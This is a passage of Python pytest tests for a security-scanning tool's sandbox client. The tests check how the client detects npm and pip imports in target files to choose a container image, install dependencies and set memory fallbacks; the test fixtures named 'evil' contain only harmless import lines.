        StubSandboxClient,
    )

    stub = StubSandboxClient()
    stub.file_content_map = {
        "fid": b"const axios = require('axios');\nconst fs = require('fs');\n"
    }

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=True,
    )

    plan = SandboxPlan(
        plan_id="p-js-bump",
        file_id="fid",
        hypothesis_id="h-js-bump",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="lean",  # ← under-picked by Sonnet
        file_name="evil.js",
    )

    await sandbox.submit(plan)

    # Bump fired + npm packages populated. fs filtered as built-in.
    assert plan.image_hint == "rich_python"
    assert "axios" in plan.runtime_npm_packages
    assert "fs" not in plan.runtime_npm_packages


@pytest.mark.asyncio
async def test_multi_image_submit_lean_js_preserved_when_builtins_only() -> None:
    """A .js plan whose target imports ONLY Node built-ins stays on
    lean (no install needed, no bump). Mirrors the Python lean-preserved
    test."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    stub = StubSandboxClient()
    stub.file_content_map = {
        "fid": b"const fs = require('fs');\nconst path = require('path');\n"
    }

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=True,
    )

    plan = SandboxPlan(
        plan_id="p-js-keep",
        file_id="fid",
        hypothesis_id="h-js-keep",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="lean",
        file_name="benign.js",
    )

    await sandbox.submit(plan)

    assert plan.image_hint == "lean"  # not bumped
    assert plan.runtime_npm_packages == []


@pytest.mark.asyncio
async def test_multi_image_submit_no_op_when_disabled_js() -> None:
    """JS auto-bump respects ``enable_per_scan_dep_install=False`` —
    parallel of the Python disabled-flag test."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    stub = StubSandboxClient()
    stub.file_content_map = {"fid": b"const axios = require('axios');\n"}

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=False,
    )

    plan = SandboxPlan(
        plan_id="p-js-off",
        file_id="fid",
        hypothesis_id="h-js-off",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="rich_python",
        file_name="evil.js",
    )

    await sandbox.submit(plan)

    assert plan.runtime_npm_packages == []


@pytest.mark.asyncio
async def test_multi_image_submit_respects_explicit_runtime_npm_packages() -> None:
    """When plan-builder already set ``runtime_npm_packages``, the
    centralized fallback must NOT overwrite. Matches the Python
    ``runtime_packages`` belt-and-braces test."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    stub = StubSandboxClient()
    stub.file_content_map = {"fid": b"const axios = require('axios');\n"}

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=True,
    )

    explicit_npm = ["explicit-npm-1", "explicit-npm-2"]
    plan = SandboxPlan(
        plan_id="p-js-explicit",
        file_id="fid",
        hypothesis_id="h-js-explicit",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="rich_python",
        file_name="evil.js",
        runtime_npm_packages=list(explicit_npm),
    )

    await sandbox.submit(plan)

    # Central fallback did NOT overwrite
    assert plan.runtime_npm_packages == explicit_npm


@pytest.mark.asyncio
async def test_multi_image_submit_handles_both_pip_and_npm() -> None:
    """If a plan has both .py and .js dep needs, we route by extension —
    .py goes through pip path, .js goes through npm path. They are
    mutually exclusive per plan (one file_name = one extension)."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    stub = StubSandboxClient()
    stub.file_content_map = {
        "py-fid": b"import selenium\n",
        "js-fid": b"const axios = require('axios');\n",
    }

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=True,
    )

    py_plan = SandboxPlan(
        plan_id="p-mix-py",
        file_id="py-fid",
        hypothesis_id="h-mix-py",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="lean",
        file_name="evil.py",
    )
    await sandbox.submit(py_plan)
    assert "selenium" in py_plan.runtime_packages
    assert py_plan.runtime_npm_packages == []  # JS path NOT triggered

    js_plan = SandboxPlan(
        plan_id="p-mix-js",
        file_id="js-fid",
        hypothesis_id="h-mix-js",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="lean",
        file_name="evil.js",
    )
    await sandbox.submit(js_plan)
    assert "axios" in js_plan.runtime_npm_packages
    assert js_plan.runtime_packages == []  # pip path NOT triggered


def test_npm_env_helper_empty() -> None:
    """No npm packages → empty env var value (caller's filter drops it)."""
    from dast.sandbox.client import _npm_env

    assert _npm_env([]) == {"RUNTIME_NPM_PACKAGES": ""}


def test_npm_env_helper_populated() -> None:
    """Multiple npm packages → space-separated env var value."""
    from dast.sandbox.client import _npm_env

    assert _npm_env(["axios", "express"]) == {"RUNTIME_NPM_PACKAGES": "axios express"}


def test_npm_env_helper_scoped_pkg() -> None:
    """Scoped packages survive the env var join unchanged."""
    from dast.sandbox.client import _npm_env

    assert _npm_env(["@aws-sdk/client-s3"]) == {"RUNTIME_NPM_PACKAGES": "@aws-sdk/client-s3"}


def test_sandbox_memory_fallback_for_unknown_tier() -> None:
    """If the orchestrator emits an unknown image_hint (e.g., a future
    tier added to prompts but missing from the table, or a typo in
    plan-generation), the submit() call falls back to 2048 MB — the
    v1.7 flat default. Defensive: never crash on memory lookup, never
    silently boot at a tiny memory size that OOMs.

    The fallback lives at the call site (``submit()``'s ``.get(hint, 2048)``);
    this test pins the contract."""
    from dast.sandbox.client import SANDBOX_MEMORY_MB_BY_TIER

    # Unknown hint must NOT be in the table — verifies the .get() fallback
    # path in submit() will actually fire.
    assert "future_tier_xyz" not in SANDBOX_MEMORY_MB_BY_TIER

    # Confirm the fallback mirrors what the code uses (2048 — v1.7 default)
    fallback = SANDBOX_MEMORY_MB_BY_TIER.get("future_tier_xyz", 2048)
    assert fallback == 2048
